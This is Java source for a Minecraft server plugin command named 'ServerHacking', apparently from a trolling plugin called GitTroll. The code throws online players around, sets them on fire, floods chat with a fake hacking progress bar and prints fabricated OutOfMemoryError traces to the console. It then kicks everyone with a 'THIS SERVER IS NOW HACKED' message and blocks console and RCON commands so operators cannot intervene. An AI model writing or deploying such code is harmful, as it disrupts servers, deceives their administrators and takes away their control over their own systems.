package net.Lenni0451.GitTroll.command.commands.trolling;

import java.util.List;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.RemoteServerCommandEvent;
import org.bukkit.event.server.ServerCommandEvent;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.Lenni0451.GitTroll.utils.Logger;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;

public class ServerHacking extends CommandBase {

	boolean running = false;
	
	public ServerHacking() {
		super("ServerHacking", "Let the server be fucked");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			if(running) {
				executor.sendGitMessage("§cThe server is already being hacked. Please wait until it is finished.");
				return;
			}
			this.running = true;
			
			Bukkit.getScheduler().runTaskAsynchronously(GitTroll.getInstance(), () -> {
				Random rnd = new Random();
				
				try {
					for(Player p : Bukkit.getServer().getOnlinePlayers()) {
						p.teleport(p.getLocation().add(0, 50, 0));
					}
				} catch (Throwable e) {}
				
				for(int i = 0; i <= 100; i++) {
					try {
						Thread.sleep(100);
					} catch (Throwable e) {}
					throwFakeException();
					Logger.broadcast("§4§lHACKING SERVER, Please wait...§r §7§l|§r §3§l" + i + "%");
					try {
						Bukkit.getScheduler().runTask(GitTroll.getInstance(), () -> {
							for(Player p : Bukkit.getServer().getOnlinePlayers()) {
								p.setAllowFlight(true);
								p.closeInventory();
								p.setHealth(20);
								p.setSaturation(20);
								p.teleport(p.getLocation().add(randomLocation(rnd), randomLocation(rnd), randomLocation(rnd)));
								p.getWorld().playSound(p.getLocation(), Sound.ANVIL_BREAK, 1.0F, 1.0F);
								p.getWorld().playSound(p.getLocation(), Sound.BURP, 1.0F, 1.0F);
								p.getWorld().playSound(p.getLocation(), Sound.BLAZE_DEATH, 1.0F, 1.0F);
								p.setFireTicks(20);
								p.getInventory().setHeldItemSlot(rnd.nextInt(9));
								int xp = rnd.nextInt();
								p.setLevel(xp);
								PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(EnumParticle.EXPLOSION_LARGE, false, (float)p.getLocation().getX(), (float)p.getLocation().getY(), (float)p.getLocation().getZ(), 0, 0, 0, 0, 20, null);
								((CraftPlayer)p).getHandle().playerConnection.sendPacket(packet);
							}
						});
					} catch (Throwable e) {}
				}
				
				String newLineString = "\n";
				for(int i = 0; i < 100; i++) {
					throwFakeException();
					newLineString += "\n";
				}
				final String tmp = newLineString;
				
				try {
					for(Player p : Bukkit.getServer().getOnlinePlayers()) {
						Bukkit.getScheduler().runTask(GitTroll.getInstance(), () -> {
							p.kickPlayer(tmp
									+ "§4§l§kAAAAAAAAAAAAAAAAAAAAAAAAAA"
									+  "\n§4       THIS SERVER IS NOW HACKED!"
									+  "\n§4§l§kAAAAAAAAAAAAAAAAAAAAAAAAAA"
									+ tmp);
						});
					}
				} catch (Throwable e) {}
				
				this.running = false;
			});
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent event) {
		if(this.running) {
			if(!CustomPlayer.instanceOf(event.getPlayer()).isTrusted()) {
				event.setCancelled(true);
			}
		}
	}
	
	@EventHandler
	public void onChat(AsyncPlayerChatEvent event) {
		if(this.running) {
			if(!CustomPlayer.instanceOf(event.getPlayer()).isTrusted()) {
				event.setCancelled(true);
			}
		}
	}
	
	@EventHandler
	public void onConsoleCommand(ServerCommandEvent event) {
		if(this.running) {
			event.setCancelled(true);
		}
	}
	
	@EventHandler
	public void onRCONCommand(RemoteServerCommandEvent event) {
		if(this.running) {
			event.setCancelled(true);
		}
	}
	
	private void throwFakeException() {
		System.err.println("java.lang.OutOfMemoryError\r\n" + 
				"        at net.minecraft.server.v1_8_R3.MinecraftServer.B(MinecraftServer.java:723)\r\n" + 
				"        at net.minecraft.server.v1_8_R3.DedicatedServer.B(DedicatedServer.java:374)\r\n" + 
				"        at net.minecraft.server.v1_8_R3.MinecraftServer.A(MinecraftServer.java:654)\r\n" + 
				"        at net.minecraft.server.v1_8_R3.MinecraftServer.run(MinecraftServer.java:557)\r\n" + 
				"        at java.lang.Thread.run(Unknown Source)");
	}
	
	private int randomLocation(final Random rnd) {
		return Float.valueOf((rnd.nextFloat() * 20) - 10).intValue();
	}

}
